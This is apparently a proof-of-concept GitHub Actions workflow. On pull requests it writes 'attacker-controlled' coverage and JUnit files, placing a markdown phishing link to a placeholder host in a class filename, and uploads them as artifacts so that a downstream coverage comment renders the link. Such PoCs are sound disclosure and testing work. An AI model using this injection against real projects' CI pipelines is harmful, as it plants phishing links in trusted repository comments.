name: Tests

on:
  pull_request:
  workflow_dispatch:

permissions: read-all

jobs:
  tests:
    name: Tests
    runs-on: ubuntu-latest
    steps:
      - name: Produce attacker-controlled coverage artifacts
        run: |
          cat > coverage.xml <<'XML'
          <?xml version="1.0" ?>
          <coverage version="7.4.0" timestamp="1700000000000" lines-valid="10" lines-covered="5" line-rate="0.5" branches-valid="0" branches-covered="0" branch-rate="0" complexity="0">
            <sources><source>/home/runner/work/x/x/src</source></sources>
            <packages>
              <package name="src" line-rate="0.5" branch-rate="0" complexity="0">
                <classes>
                  <class name="poc.py" filename="src/[Verify your account here](https://example.invalid/poc-phish)" line-rate="0.5" branch-rate="0" complexity="0">
                    <methods/>
                    <lines><line number="1" hits="1"/><line number="2" hits="0"/></lines>
                  </class>
                </classes>
              </package>
            </packages>
          </coverage>
          XML
          cat > coverage-junit.xml <<'XML'
          <?xml version="1.0" encoding="utf-8"?>
          <testsuites><testsuite name="pytest" errors="0" failures="0" skipped="0" tests="1" time="0.01">
          <testcase classname="tests.poc" name="test_poc" time="0.01"/></testsuite></testsuites>
          XML
      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: |
            coverage.xml
            coverage-junit.xml
          if-no-files-found: error
